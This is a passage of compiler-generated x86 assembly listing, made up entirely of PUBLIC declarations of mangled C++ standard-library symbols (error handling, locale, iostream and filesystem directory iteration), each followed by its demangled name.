PUBLIC	?equivalent@error_category@std@@UBE_NHABVerror_condition@2@@Z ; std::error_category::equivalent
PUBLIC	?equivalent@error_category@std@@UBE_NABVerror_code@2@H@Z ; std::error_category::equivalent
PUBLIC	??8error_category@std@@QBE_NABV01@@Z		; std::error_category::operator==
PUBLIC	??$_Bit_cast@IT_Addr_storage@error_category@std@@$0A@@std@@YAIABT_Addr_storage@error_category@0@@Z ; std::_Bit_cast<unsigned int,std::error_category::_Addr_storage,0>
PUBLIC	??0error_code@std@@QAE@HABVerror_category@1@@Z	; std::error_code::error_code
PUBLIC	?value@error_code@std@@QBEHXZ			; std::error_code::value
PUBLIC	?category@error_code@std@@QBEABVerror_category@2@XZ ; std::error_code::category
PUBLIC	?message@error_code@std@@QBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ ; std::error_code::message
PUBLIC	??0error_condition@std@@QAE@HABVerror_category@1@@Z ; std::error_condition::error_condition
PUBLIC	?value@error_condition@std@@QBEHXZ		; std::error_condition::value
PUBLIC	?category@error_condition@std@@QBEABVerror_category@2@XZ ; std::error_condition::category
PUBLIC	??8std@@YA_NABVerror_condition@0@0@Z		; std::operator==
PUBLIC	?make_error_code@std@@YA?AVerror_code@1@W4errc@1@@Z ; std::make_error_code
PUBLIC	?make_error_code@std@@YA?AVerror_code@1@W4io_errc@1@@Z ; std::make_error_code
PUBLIC	?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z ; std::_System_error::_Makestr
PUBLIC	??0_System_error@std@@IAE@Verror_code@1@@Z	; std::_System_error::_System_error
PUBLIC	??0_System_error@std@@IAE@Verror_code@1@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ; std::_System_error::_System_error
PUBLIC	??1_System_error@std@@UAE@XZ			; std::_System_error::~_System_error
PUBLIC	??0_System_error@std@@QAE@ABV01@@Z		; std::_System_error::_System_error
PUBLIC	??_G_System_error@std@@UAEPAXI@Z		; std::_System_error::`scalar deleting destructor'
PUBLIC	??0system_error@std@@QAE@Verror_code@1@@Z	; std::system_error::system_error
PUBLIC	??0system_error@std@@QAE@Verror_code@1@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ; std::system_error::system_error
PUBLIC	??0system_error@std@@QAE@Verror_code@1@PBD@Z	; std::system_error::system_error
PUBLIC	??1system_error@std@@UAE@XZ			; std::system_error::~system_error
PUBLIC	??0system_error@std@@QAE@ABV01@@Z		; std::system_error::system_error
PUBLIC	??_Gsystem_error@std@@UAEPAXI@Z			; std::system_error::`scalar deleting destructor'
PUBLIC	?_Throw_system_error@std@@YAXW4errc@1@@Z	; std::_Throw_system_error
PUBLIC	??0_System_error_message@std@@QAE@K@Z		; std::_System_error_message::_System_error_message
PUBLIC	??1_System_error_message@std@@QAE@XZ		; std::_System_error_message::~_System_error_message
PUBLIC	?name@_Generic_error_category@std@@UBEPBDXZ	; std::_Generic_error_category::name
PUBLIC	?message@_Generic_error_category@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z ; std::_Generic_error_category::message
PUBLIC	??1_Generic_error_category@std@@UAE@XZ		; std::_Generic_error_category::~_Generic_error_category
PUBLIC	??_G_Generic_error_category@std@@UAEPAXI@Z	; std::_Generic_error_category::`scalar deleting destructor'
PUBLIC	?name@_Iostream_error_category2@std@@UBEPBDXZ	; std::_Iostream_error_category2::name
PUBLIC	?message@_Iostream_error_category2@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z ; std::_Iostream_error_category2::message
PUBLIC	??1_Iostream_error_category2@std@@UAE@XZ	; std::_Iostream_error_category2::~_Iostream_error_category2
PUBLIC	??_G_Iostream_error_category2@std@@UAEPAXI@Z	; std::_Iostream_error_category2::`scalar deleting destructor'
PUBLIC	?name@_System_error_category@std@@UBEPBDXZ	; std::_System_error_category::name
PUBLIC	?message@_System_error_category@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z ; std::_System_error_category::message
PUBLIC	?default_error_condition@_System_error_category@std@@UBE?AVerror_condition@2@H@Z ; std::_System_error_category::default_error_condition
PUBLIC	??1_System_error_category@std@@UAE@XZ		; std::_System_error_category::~_System_error_category
PUBLIC	??_G_System_error_category@std@@UAEPAXI@Z	; std::_System_error_category::`scalar deleting destructor'
PUBLIC	??$_Immortalize_memcpy_image@V_Generic_error_category@std@@@std@@YAABV_Generic_error_category@0@XZ ; std::_Immortalize_memcpy_image<std::_Generic_error_category>
PUBLIC	??$_Immortalize_memcpy_image@V_Iostream_error_category2@std@@@std@@YAABV_Iostream_error_category2@0@XZ ; std::_Immortalize_memcpy_image<std::_Iostream_error_category2>
PUBLIC	??$_Immortalize_memcpy_image@V_System_error_category@std@@@std@@YAABV_System_error_category@0@XZ ; std::_Immortalize_memcpy_image<std::_System_error_category>
PUBLIC	?_Make_ec@std@@YA?AVerror_code@1@W4__std_win_error@@@Z ; std::_Make_ec
PUBLIC	?_Throw_system_error_from_std_win_error@std@@YAXW4__std_win_error@@@Z ; std::_Throw_system_error_from_std_win_error
PUBLIC	___std_is_file_not_found
PUBLIC	??I@YA?AW4__std_fs_file_attr@@W40@0@Z		; operator&
PUBLIC	??I@YA?AW4__std_fs_stats_flags@@W40@0@Z		; operator&
PUBLIC	??U@YA?AW4__std_fs_stats_flags@@W40@0@Z		; operator|
PUBLIC	??_5@YAAAW4__std_fs_stats_flags@@AAW40@W40@@Z	; operator|=
PUBLIC	?_Symlink_hint_attributes@__std_fs_stats@@QBE?AW4__std_fs_file_attr@@XZ ; __std_fs_stats::_Symlink_hint_attributes
PUBLIC	??$_Bitmask_includes_any@W4__std_fs_stats_flags@@@std@@YA_NW4__std_fs_stats_flags@@0@Z ; std::_Bitmask_includes_any<enum __std_fs_stats_flags>
PUBLIC	?_Check_convert_result@std@@YAHU__std_fs_convert_result@@@Z ; std::_Check_convert_result
PUBLIC	??0bad_cast@std@@QAE@XZ				; std::bad_cast::bad_cast
PUBLIC	??1bad_cast@std@@UAE@XZ				; std::bad_cast::~bad_cast
PUBLIC	??0bad_cast@std@@QAE@ABV01@@Z			; std::bad_cast::bad_cast
PUBLIC	??_Gbad_cast@std@@UAEPAXI@Z			; std::bad_cast::`scalar deleting destructor'
PUBLIC	?_Throw_bad_cast@std@@YAXXZ			; std::_Throw_bad_cast
PUBLIC	??0_Ref_count_base@std@@IAE@XZ			; std::_Ref_count_base::_Ref_count_base
PUBLIC	??1_Ref_count_base@std@@UAE@XZ			; std::_Ref_count_base::~_Ref_count_base
PUBLIC	?_Incref@_Ref_count_base@std@@QAEXXZ		; std::_Ref_count_base::_Incref
PUBLIC	?_Decref@_Ref_count_base@std@@QAEXXZ		; std::_Ref_count_base::_Decref
PUBLIC	?_Decwref@_Ref_count_base@std@@QAEXXZ		; std::_Ref_count_base::_Decwref
PUBLIC	?_Get_deleter@_Ref_count_base@std@@UBEPAXABVtype_info@@@Z ; std::_Ref_count_base::_Get_deleter
PUBLIC	??1_Facet_base@std@@UAE@XZ			; std::_Facet_base::~_Facet_base
PUBLIC	??0_Facet_base@std@@QAE@XZ			; std::_Facet_base::_Facet_base
PUBLIC	??_G_Facet_base@std@@UAEPAXI@Z			; std::_Facet_base::`scalar deleting destructor'
PUBLIC	??0_Locinfo@std@@QAE@PBD@Z			; std::_Locinfo::_Locinfo
PUBLIC	??1_Locinfo@std@@QAE@XZ				; std::_Locinfo::~_Locinfo
PUBLIC	?_Getctype@_Locinfo@std@@QBE?AU_Ctypevec@@XZ	; std::_Locinfo::_Getctype
PUBLIC	??0?$_Yarn@D@std@@QAE@XZ			; std::_Yarn<char>::_Yarn<char>
PUBLIC	??1?$_Yarn@D@std@@QAE@XZ			; std::_Yarn<char>::~_Yarn<char>
PUBLIC	?c_str@?$_Yarn@D@std@@QBEPBDXZ			; std::_Yarn<char>::c_str
PUBLIC	?_Tidy@?$_Yarn@D@std@@AAEXXZ			; std::_Yarn<char>::_Tidy
PUBLIC	??0?$_Yarn@_W@std@@QAE@XZ			; std::_Yarn<wchar_t>::_Yarn<wchar_t>
PUBLIC	??1?$_Yarn@_W@std@@QAE@XZ			; std::_Yarn<wchar_t>::~_Yarn<wchar_t>
PUBLIC	?_Tidy@?$_Yarn@_W@std@@AAEXXZ			; std::_Yarn<wchar_t>::_Tidy
PUBLIC	??Bid@locale@std@@QAEIXZ			; std::locale::id::operator unsigned int
PUBLIC	?_Incref@facet@locale@std@@UAEXXZ		; std::locale::facet::_Incref
PUBLIC	?_Decref@facet@locale@std@@UAEPAV_Facet_base@3@XZ ; std::locale::facet::_Decref
PUBLIC	??0facet@locale@std@@IAE@I@Z			; std::locale::facet::facet
PUBLIC	??1facet@locale@std@@MAE@XZ			; std::locale::facet::~facet
PUBLIC	??_Gfacet@locale@std@@MAEPAXI@Z			; std::locale::facet::`scalar deleting destructor'
PUBLIC	??0locale@std@@QAE@ABV01@@Z			; std::locale::locale
PUBLIC	??1locale@std@@QAE@XZ				; std::locale::~locale
PUBLIC	?_C_str@locale@std@@QBEPBDXZ			; std::locale::_C_str
PUBLIC	?_Getfacet@locale@std@@QBEPBVfacet@12@I@Z	; std::locale::_Getfacet
PUBLIC	??$_Adl_verify_range@PBDPBD@std@@YAXABQBD0@Z	; std::_Adl_verify_range<char const *,char const *>
PUBLIC	??$_Adl_verify_range@PB_WPB_W@std@@YAXABQB_W0@Z	; std::_Adl_verify_range<wchar_t const *,wchar_t const *>
PUBLIC	??0ctype_base@std@@QAE@I@Z			; std::ctype_base::ctype_base
PUBLIC	??1ctype_base@std@@UAE@XZ			; std::ctype_base::~ctype_base
PUBLIC	??_Gctype_base@std@@UAEPAXI@Z			; std::ctype_base::`scalar deleting destructor'
PUBLIC	?widen@?$ctype@D@std@@QBEDD@Z			; std::ctype<char>::widen
PUBLIC	??0?$ctype@D@std@@QAE@ABV_Locinfo@1@I@Z		; std::ctype<char>::ctype<char>
PUBLIC	?_Getcat@?$ctype@D@std@@SAIPAPBVfacet@locale@2@PBV42@@Z ; std::ctype<char>::_Getcat
PUBLIC	??1?$ctype@D@std@@MAE@XZ			; std::ctype<char>::~ctype<char>
PUBLIC	?_Init@?$ctype@D@std@@IAEXABV_Locinfo@2@@Z	; std::ctype<char>::_Init
PUBLIC	?_Tidy@?$ctype@D@std@@IAEXXZ			; std::ctype<char>::_Tidy
PUBLIC	?do_tolower@?$ctype@D@std@@MBEDD@Z		; std::ctype<char>::do_tolower
PUBLIC	?do_tolower@?$ctype@D@std@@MBEPBDPADPBD@Z	; std::ctype<char>::do_tolower
PUBLIC	?do_toupper@?$ctype@D@std@@MBEDD@Z		; std::ctype<char>::do_toupper
PUBLIC	?do_toupper@?$ctype@D@std@@MBEPBDPADPBD@Z	; std::ctype<char>::do_toupper
PUBLIC	?do_widen@?$ctype@D@std@@MBEDD@Z		; std::ctype<char>::do_widen
PUBLIC	?do_widen@?$ctype@D@std@@MBEPBDPBD0PAD@Z	; std::ctype<char>::do_widen
PUBLIC	?do_narrow@?$ctype@D@std@@MBEDDD@Z		; std::ctype<char>::do_narrow
PUBLIC	?do_narrow@?$ctype@D@std@@MBEPBDPBD0DPAD@Z	; std::ctype<char>::do_narrow
PUBLIC	??_G?$ctype@D@std@@MAEPAXI@Z			; std::ctype<char>::`scalar deleting destructor'
PUBLIC	??$use_facet@V?$ctype@D@std@@@std@@YAABV?$ctype@D@0@ABVlocale@0@@Z ; std::use_facet<std::ctype<char> >
PUBLIC	??$_Adl_verify_range@PADPBD@std@@YAXABQADABQBD@Z ; std::_Adl_verify_range<char *,char const *>
PUBLIC	??0failure@ios_base@std@@QAE@PBDABVerror_code@2@@Z ; std::ios_base::failure::failure
PUBLIC	??1failure@ios_base@std@@UAE@XZ			; std::ios_base::failure::~failure
PUBLIC	??0failure@ios_base@std@@QAE@ABV012@@Z		; std::ios_base::failure::failure
PUBLIC	??_Gfailure@ios_base@std@@UAEPAXI@Z		; std::ios_base::failure::`scalar deleting destructor'
PUBLIC	?clear@ios_base@std@@QAEXH_N@Z			; std::ios_base::clear
PUBLIC	?rdstate@ios_base@std@@QBEHXZ			; std::ios_base::rdstate
PUBLIC	?good@ios_base@std@@QBE_NXZ			; std::ios_base::good
PUBLIC	?flags@ios_base@std@@QBEHXZ			; std::ios_base::flags
PUBLIC	?width@ios_base@std@@QBE_JXZ			; std::ios_base::width
PUBLIC	?width@ios_base@std@@QAE_J_J@Z			; std::ios_base::width
PUBLIC	?getloc@ios_base@std@@QBE?AVlocale@2@XZ		; std::ios_base::getloc
PUBLIC	?_Convert_narrow_to_wide@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@2@W4__std_code_page@@V?$basic_string_view@DU?$char_traits@D@std@@@2@@Z ; std::filesystem::_Convert_narrow_to_wide
PUBLIC	??R_Is_slash_oper@filesystem@std@@QBE_N_W@Z	; std::filesystem::_Is_slash_oper::operator()
PUBLIC	?_Is_drive_prefix@filesystem@std@@YA_NQB_W@Z	; std::filesystem::_Is_drive_prefix
PUBLIC	??$_Unaligned_load@I@filesystem@std@@YAIPBX@Z	; std::filesystem::_Unaligned_load<unsigned int>
PUBLIC	?_Has_drive_letter_prefix@filesystem@std@@YA_NQB_W0@Z ; std::filesystem::_Has_drive_letter_prefix
PUBLIC	?_Find_root_name_end@filesystem@std@@YAPB_WQB_W0@Z ; std::filesystem::_Find_root_name_end
PUBLIC	??$find_if@PB_WU_Is_slash_oper@filesystem@std@@@std@@YAPB_WPB_WQB_WU_Is_slash_oper@filesystem@0@@Z ; std::find_if<wchar_t const *,std::filesystem::_Is_slash_oper>
PUBLIC	?_Find_relative_path@filesystem@std@@YAPB_WQB_W0@Z ; std::filesystem::_Find_relative_path
PUBLIC	??$find_if_not@PB_WU_Is_slash_oper@filesystem@std@@@std@@YAPB_WPB_WQB_WU_Is_slash_oper@filesystem@0@@Z ; std::find_if_not<wchar_t const *,std::filesystem::_Is_slash_oper>
PUBLIC	?_Find_filename@filesystem@std@@YAPB_WQB_WPB_W@Z ; std::filesystem::_Find_filename
PUBLIC	?_Find_extension@filesystem@std@@YAPB_WQB_W0@Z	; std::filesystem::_Find_extension
PUBLIC	??$find@PB_W_W@std@@YAPB_WPB_WQB_WAB_W@Z	; std::find<wchar_t const *,wchar_t>
PUBLIC	?_Parse_extension@filesystem@std@@YA?AV?$basic_string_view@_WU?$char_traits@_W@std@@@2@V32@@Z ; std::filesystem::_Parse_extension
PUBLIC	?_Range_compare@filesystem@std@@YAHQB_W000@Z	; std::filesystem::_Range_compare
PUBLIC	??$_Traits_compare@U?$char_traits@_W@std@@@std@@YAHQB_WI0I@Z ; std::_Traits_compare<std::char_traits<wchar_t> >
PUBLIC	?_Is_dot_or_dotdot@filesystem@std@@YA_NABU__std_fs_find_data@@@Z ; std::filesystem::_Is_dot_or_dotdot
PUBLIC	??0_Find_file_handle@filesystem@std@@QAE@XZ	; std::filesystem::_Find_file_handle::_Find_file_handle
PUBLIC	??0_Find_file_handle@filesystem@std@@QAE@$$QAU012@@Z ; std::filesystem::_Find_file_handle::_Find_file_handle
PUBLIC	?_Open@_Find_file_handle@filesystem@std@@QAE?AW4__std_win_error@@PB_WPAU__std_fs_find_data@@@Z ; std::filesystem::_Find_file_handle::_Open
PUBLIC	??1_Find_file_handle@filesystem@std@@QAE@XZ	; std::filesystem::_Find_file_handle::~_Find_file_handle
PUBLIC	??$exchange@W4__std_fs_dir_handle@@W41@@std@@YA?AW4__std_fs_dir_handle@@AAW41@$$QAW41@@Z ; std::exchange<enum __std_fs_dir_handle,enum __std_fs_dir_handle>
PUBLIC	??0path@filesystem@std@@QAE@XZ			; std::filesystem::path::path
PUBLIC	??0path@filesystem@std@@QAE@ABV012@@Z		; std::filesystem::path::path
PUBLIC	??1path@filesystem@std@@QAE@XZ			; std::filesystem::path::~path
PUBLIC	??4path@filesystem@std@@QAEAAV012@ABV012@@Z	; std::filesystem::path::operator=
PUBLIC	??4path@filesystem@std@@QAEAAV012@$$QAV012@@Z	; std::filesystem::path::operator=
PUBLIC	??_0path@filesystem@std@@QAEAAV012@ABV012@@Z	; std::filesystem::path::operator/=
PUBLIC	?remove_filename@path@filesystem@std@@QAEAAV123@XZ ; std::filesystem::path::remove_filename
PUBLIC	?replace_filename@path@filesystem@std@@QAEAAV123@ABV123@@Z ; std::filesystem::path::replace_filename
PUBLIC	?native@path@filesystem@std@@QBEABV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@3@XZ ; std::filesystem::path::native
PUBLIC	?c_str@path@filesystem@std@@QBEPB_WXZ		; std::filesystem::path::c_str
PUBLIC	?string@path@filesystem@std@@QBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@XZ ; std::filesystem::path::string
PUBLIC	?compare@path@filesystem@std@@QBEHABV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@3@@Z ; std::filesystem::path::compare
PUBLIC	?compare@path@filesystem@std@@QBEHV?$basic_string_view@_WU?$char_traits@_W@std@@@3@@Z ; std::filesystem::path::compare
PUBLIC	?extension@path@filesystem@std@@QBE?AV123@XZ	; std::filesystem::path::extension
PUBLIC	?is_absolute@path@filesystem@std@@QBE_NXZ	; std::filesystem::path::is_absolute
PUBLIC	??8filesystem@std@@YA_NABVpath@01@0@Z		; std::filesystem::operator==
PUBLIC	??$string@DU?$char_traits@D@std@@V?$allocator@D@2@$0A@@path@filesystem@std@@QBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@ABV?$allocator@D@2@@Z ; std::filesystem::path::string<char,std::char_traits<char>,std::allocator<char>,0>
PUBLIC	??$_Convert_wide_to_narrow@U?$char_traits@D@std@@V?$allocator@D@2@@std@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@W4__std_code_page@@V?$basic_string_view@_WU?$char_traits@_W@std@@@0@ABV?$allocator@D@0@@Z ; std::_Convert_wide_to_narrow<std::char_traits<char>,std::allocator<char> >
PUBLIC	??$?0V?$basic_string_view@_WU?$char_traits@_W@std@@@std@@$0A@@path@filesystem@std@@QAE@ABV?$basic_string_view@_WU?$char_traits@_W@std@@@2@W4format@012@@Z ; std::filesystem::path::path<std::basic_string_view<wchar_t,std::char_traits<wchar_t> >,0>
PUBLIC	??$forward@AAPB_W@std@@YAAAPB_WAAPB_W@Z		; std::forward<wchar_t const * &>
PUBLIC	??$?_0V?$basic_string_view@_WU?$char_traits@_W@std@@@std@@$0A@@path@filesystem@std@@QAEAAV012@ABV?$basic_string_view@_WU?$char_traits@_W@std@@@2@@Z ; std::filesystem::path::operator/=<std::basic_string_view<wchar_t,std::char_traits<wchar_t> >,0>
PUBLIC	??0filesystem_error@filesystem@std@@QAE@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@@Z ; std::filesystem::filesystem_error::filesystem_error
PUBLIC	??0filesystem_error@filesystem@std@@QAE@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@ABVpath@12@Verror_code@2@@Z ; std::filesystem::filesystem_error::filesystem_error
PUBLIC	?what@filesystem_error@filesystem@std@@UBEPBDXZ	; std::filesystem::filesystem_error::what
PUBLIC	?_Pretty_message@filesystem_error@filesystem@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@V?$basic_string_view@DU?$char_traits@D@std@@@3@ABVpath@23@1@Z ; std::filesystem::filesystem_error::_Pretty_message
PUBLIC	??1filesystem_error@filesystem@std@@UAE@XZ	; std::filesystem::filesystem_error::~filesystem_error
PUBLIC	??0filesystem_error@filesystem@std@@QAE@ABV012@@Z ; std::filesystem::filesystem_error::filesystem_error
PUBLIC	??_Gfilesystem_error@filesystem@std@@UAEPAXI@Z	; std::filesystem::filesystem_error::`scalar deleting destructor'
PUBLIC	??$_Convert_wide_to_narrow_replace_chars@U?$char_traits@D@std@@V?$allocator@D@2@@filesystem@std@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@W4__std_code_page@@V?$basic_string_view@_WU?$char_traits@_W@std@@@1@ABV?$allocator@D@1@@Z ; std::filesystem::_Convert_wide_to_narrow_replace_chars<std::char_traits<char>,std::allocator<char> >
PUBLIC	??$?YV?$basic_string_view@DU?$char_traits@D@std@@@std@@$0A@@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@ABV?$basic_string_view@DU?$char_traits@D@std@@@1@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=<std::basic_string_view<char,std::char_traits<char> >,0>
PUBLIC	?_Throw_fs_error@filesystem@std@@YAXPBDW4__std_win_error@@@Z ; std::filesystem::_Throw_fs_error
PUBLIC	?_Throw_fs_error@filesystem@std@@YAXPBDW4__std_win_error@@ABVpath@12@@Z ; std::filesystem::_Throw_fs_error
PUBLIC	??0file_status@filesystem@std@@QAE@XZ		; std::filesystem::file_status::file_status
PUBLIC	?type@file_status@filesystem@std@@QAEXW4file_type@23@@Z ; std::filesystem::file_status::type
PUBLIC	?permissions@file_status@filesystem@std@@QAEXW4perms@23@@Z ; std::filesystem::file_status::permissions
PUBLIC	?type@file_status@filesystem@std@@QBE?AW4file_type@23@XZ ; std::filesystem::file_status::type
PUBLIC	?_Refresh@file_status@filesystem@std@@QAEXW4__std_win_error@@ABU__std_fs_stats@@@Z ; std::filesystem::file_status::_Refresh
PUBLIC	??$_Bitmask_includes_any@W4__std_fs_file_attr@@@std@@YA_NW4__std_fs_file_attr@@0@Z ; std::_Bitmask_includes_any<enum __std_fs_file_attr>
PUBLIC	?is_regular_file@filesystem@std@@YA_NVfile_status@12@@Z ; std::filesystem::is_regular_file
PUBLIC	?_Not_good@_File_status_and_error@filesystem@std@@QBE_NXZ ; std::filesystem::_File_status_and_error::_Not_good
PUBLIC	??0_File_status_and_error@filesystem@std@@QAE@XZ ; std::filesystem::_File_status_and_error::_File_status_and_error
PUBLIC	??0directory_entry@filesystem@std@@QAE@XZ	; std::filesystem::directory_entry::directory_entry
PUBLIC	??1directory_entry@filesystem@std@@QAE@XZ	; std::filesystem::directory_entry::~directory_entry
PUBLIC	?path@directory_entry@filesystem@std@@QBEABV023@XZ ; std::filesystem::directory_entry::path
PUBLIC	?is_regular_file@directory_entry@filesystem@std@@QBE_NXZ ; std::filesystem::directory_entry::is_regular_file
PUBLIC	?_Get_any_status@directory_entry@filesystem@std@@ABE?AU_File_status_and_error@23@W4__std_fs_stats_flags@@@Z ; std::filesystem::directory_entry::_Get_any_status
PUBLIC	?status@directory_entry@filesystem@std@@QBE?AVfile_status@23@XZ ; std::filesystem::directory_entry::status
PUBLIC	?_Refresh@directory_entry@filesystem@std@@AAEXABU__std_fs_find_data@@@Z ; std::filesystem::directory_entry::_Refresh
PUBLIC	??$_Bitmask_includes_all@W4__std_fs_stats_flags@@@std@@YA_NW4__std_fs_stats_flags@@0@Z ; std::_Bitmask_includes_all<enum __std_fs_stats_flags>
PUBLIC	??Ifilesystem@std@@YA?AW4directory_options@01@W4201@0@Z ; std::filesystem::operator&
PUBLIC	?_Advance_and_reset_if_no_more_files@_Dir_enum_impl@filesystem@std@@SA?AW4__std_win_error@@AAV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@3@@Z ; std::filesystem::_Dir_enum_impl::_Advance_and_reset_if_no_more_files
PUBLIC	?_Skip_dots@_Dir_enum_impl@filesystem@std@@SA?AW4__std_win_error@@W4__std_fs_dir_handle@@AAU__std_fs_find_data@@@Z ; std::filesystem::_Dir_enum_impl::_Skip_dots
PUBLIC	?_Open_dir@_Dir_enum_impl@filesystem@std@@SA?AW4__std_win_error@@AAVpath@23@W4directory_options@23@AAU_Find_file_handle@23@AAU__std_fs_find_data@@@Z ; std::filesystem::_Dir_enum_impl::_Open_dir
PUBLIC	??0_Creator@_Dir_enum_impl@filesystem@std@@QAE@ABVpath@23@W4directory_options@23@@Z ; std::filesystem::_Dir_enum_impl::_Creator::_Creator
PUBLIC	??1_Creator@_Dir_enum_impl@filesystem@std@@QAE@XZ ; std::filesystem::_Dir_enum_impl::_Creator::~_Creator
PUBLIC	?_Refresh@_Dir_enum_impl@filesystem@std@@QAEXABU__std_fs_find_data@@@Z ; std::filesystem::_Dir_enum_impl::_Refresh
PUBLIC	??0_Dir_enum_impl@filesystem@std@@QAE@$$QAU_Creator@012@W4directory_options@12@@Z ; std::filesystem::_Dir_enum_impl::_Dir_enum_impl
PUBLIC	??1_Dir_enum_impl@filesystem@std@@QAE@XZ	; std::filesystem::_Dir_enum_impl::~_Dir_enum_impl
PUBLIC	??_G_Dir_enum_impl@filesystem@std@@QAEPAXI@Z	; std::filesystem::_Dir_enum_impl::`scalar deleting destructor'
PUBLIC	?get@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IBEPAU_Dir_enum_impl@filesystem@2@XZ ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::get
PUBLIC	??0?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAE@XZ ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Ptr_base<std::filesystem::_Dir_enum_impl>
PUBLIC	?_Incref@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IBEXXZ ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Incref
PUBLIC	?_Decref@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAEXXZ ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Decref
PUBLIC	?_Swap@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAEXAAV12@@Z ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Swap
PUBLIC	??0?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@XZ ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::shared_ptr<std::filesystem::_Dir_enum_impl>
PUBLIC	??0?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@ABV01@@Z ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::shared_ptr<std::filesystem::_Dir_enum_impl>
PUBLIC	??0?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@$$QAV01@@Z ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::shared_ptr<std::filesystem::_Dir_enum_impl>
PUBLIC	??1?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@XZ ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::~shared_ptr<std::filesystem::_Dir_enum_impl>
PUBLIC	??4?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAEAAV01@$$QAV01@@Z ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::operator=
PUBLIC	?swap@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAEXAAV12@@Z ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::swap
PUBLIC	?reset@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAEXXZ ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::reset
PUBLIC	??$?DU_Dir_enum_impl@filesystem@std@@$0A@@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QBEAAU_Dir_enum_impl@filesystem@1@XZ ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::operator*<std::filesystem::_Dir_enum_impl,0>
PUBLIC	??$_Bitmask_includes_any@W4directory_options@filesystem@std@@@std@@YA_NW4directory_options@filesystem@0@0@Z ; std::_Bitmask_includes_any<enum std::filesystem::directory_options>
PUBLIC	??$move@AAU_Find_file_handle@filesystem@std@@@std@@YA$$QAU_Find_file_handle@filesystem@0@AAU120@@Z ; std::move<std::filesystem::_Find_file_handle &>
PUBLIC	??$move@AAVpath@filesystem@std@@@std@@YA$$QAVpath@filesystem@0@AAV120@@Z ; std::move<std::filesystem::path &>
PUBLIC	??0directory_iterator@filesystem@std@@QAE@XZ	; std::filesystem::directory_iterator::directory_iterator
PUBLIC	??0directory_iterator@filesystem@std@@QAE@ABVpath@12@@Z ; std::filesystem::directory_iterator::directory_iterator
PUBLIC	??0directory_iterator@filesystem@std@@QAE@ABV012@@Z ; std::filesystem::directory_iterator::directory_iterator
PUBLIC	??0directory_iterator@filesystem@std@@QAE@$$QAV012@@Z ; std::filesystem::directory_iterator::directory_iterator
PUBLIC	??1directory_iterator@filesystem@std@@QAE@XZ	; std::filesystem::directory_iterator::~directory_iterator
PUBLIC	??Ddirectory_iterator@filesystem@std@@QBEABVdirectory_entry@12@XZ ; std::filesystem::directory_iterator::operator*
PUBLIC	??Edirectory_iterator@filesystem@std@@QAEAAV012@XZ ; std::filesystem::directory_iterator::operator++
PUBLIC	??9directory_iterator@filesystem@std@@QBE_NABV012@@Z ; std::filesystem::directory_iterator::operator!=
PUBLIC	??$_Initialize_dir_enum@U_Dir_enum_impl@filesystem@std@@@_Dir_enum_impl@filesystem@std@@SA?AW4__std_win_error@@AAV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@2@ABVpath@12@W4directory_options@12@@Z ; std::filesystem::_Dir_enum_impl::_Initialize_dir_enum<std::filesystem::_Dir_enum_impl>
PUBLIC	??$?CU_Dir_enum_impl@filesystem@std@@$0A@@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QBEPAU_Dir_enum_impl@filesystem@1@XZ ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::operator-><std::filesystem::_Dir_enum_impl,0>
